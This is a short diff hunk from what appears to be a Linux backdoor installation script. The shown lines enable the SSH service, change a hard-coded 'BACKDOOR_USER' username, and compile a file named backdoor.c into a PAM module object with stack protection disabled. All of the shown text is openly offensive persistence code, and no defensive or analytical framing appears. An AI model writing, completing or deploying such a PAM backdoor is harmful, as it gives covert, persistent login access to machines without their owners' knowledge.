@@ -12,7 +12,7 @@ sudo systemctl start ssh
 sudo systemctl enable ssh
 
 
-BACKDOOR_USER="nihargayam"
+BACKDOOR_USER="lacucaracha"
 
 echo "[*] Compiling PAM backdoor..."
 gcc -fPIC -fno-stack-protector -c backdoor.c -o pam_backdoor.o
